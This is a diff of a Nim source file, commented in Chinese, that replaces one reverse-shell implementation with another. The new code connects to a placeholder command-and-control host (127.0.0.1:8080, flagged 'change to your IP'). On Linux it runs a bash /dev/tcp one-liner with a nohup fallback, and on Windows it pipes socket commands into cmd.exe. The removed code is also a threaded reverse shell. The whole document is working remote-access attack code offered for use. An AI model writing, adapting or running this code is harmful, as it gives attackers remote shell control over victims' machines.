@@ -1,73 +1,53 @@
-import std/[net, osproc, os, streams]
+import std/[net, os, osproc, strutils, strformat, streams]
 
-# 定义通道数据结构，用于线程间通信
-type
-  ShellContext = ref object
-    socket: Socket
-    processInput: Stream
-    processOutput: Stream
+const
+  C2_HOST = "127.0.0.1"   # ← 改成你的IP
+  C2_PORT = 8080          # ← 改成你的端口
 
-proc readProcessOutput(ctx: ShellContext) {.thread.} =
-  ## 线程 1：负责死循环读取进程输出，并发送给 Socket
-  var buffer = newString(4096)
-  while true:
-    try:
-      # 使用 readDataStr 代替 readAll，它有多少读多少，不会死等 EOF
-      let bytesRead = ctx.processOutput.readDataStr(buffer, 0..4095)
-      if bytesRead > 0:
-        ctx.socket.send(buffer[0..<bytesRead])
-      else:
-        sleep(10) # 没数据时稍微休息
-    except:
-      break
-
-proc handleSocketInput(ctx: ShellContext) =
-  ## 主线程：负责从 Socket 接收命令，并写入进程
-  var command = ""
-  while true:
-    try:
-      ctx.socket.readLine(command)
-      if command.len >= 0:
-        ctx.processInput.write(command & "\n")
-        ctx.processInput.flush()
-    except:
-      break
-
-proc reverseShell(host: string, port: Port) =
-  var socket = newSocket()
+proc linuxOneLinerReverseShell() =
+  ## Linux 最佳一句话反弹Shell（最稳定版）
+  let cmd = fmt"""bash -c 'bash -i >& /dev/tcp/{C2_HOST}/{C2_PORT} 0>&1'"""
+  
   try:
-    socket.connect(host, port)
+    discard execCmd(cmd)
+  except:
+    # 备用方案
+    discard execCmd(fmt"nohup bash -i >& /dev/tcp/{C2_HOST}/{C2_PORT} 0>&1 2>&1 &")
+
+proc windowsReverseShell() =
+  try:
+    var socket = newSocket()
+    socket.connect(C2_HOST, Port(C2_PORT))
+    socket.send("Windows Nim reverse shell connected\n")
     
-    when defined(windows):
-      const shellCmd = "cmd.exe"
-    else:
-      const shellCmd = "/bin/sh"
-
-    # 启动子进程
-    var process = startProcess(shellCmd, options = {poUsePath, poStdErrToStdOut})
+    var process = startProcess("cmd.exe", options = {poUsePath, poStdErrToStdOut})
     
-    let ctx = ShellContext(
-      socket: socket,
-      processInput: process.inputStream(),
-      processOutput: process.outputStream()
-    )
-
-    # 创建独立线程专门负责读进程回显
-    var outputThread: Thread[ShellContext]
-    createThread(outputThread, readProcessOutput, ctx)
-
-    # 主线程负责堵塞监听网络输入
-    handleSocketInput(ctx)
-
-    # 清理
-    joinThread(outputThread)
+    let inputS  = process.inputStream()
+    let outputS = process.outputStream()
+    
+    while true:
+      let line = socket.recvLine().strip()
+      if line.len == 0: continue
+      if line.toLowerAscii() in ["exit", "quit"]: break
+      
+      streams.write(inputS, line & "\n")
+      streams.flush(inputS)
+      
+      sleep(150)
+      let output = outputS.readAll()
+      if output.len > 0:
+        socket.send(output)
+    
     process.close()
+    socket.close()
   except:
     discard
-  finally:
-    socket.close()
+
+proc main() =
+  when defined(linux):
+    linuxOneLinerReverseShell()
+  else:
+    windowsReverseShell()
 
 when isMainModule:
-  let targetIP = "127.0.0.1" 
-  let targetPort = Port(8080)
-  reverseShell(targetIP, targetPort)
+  main()
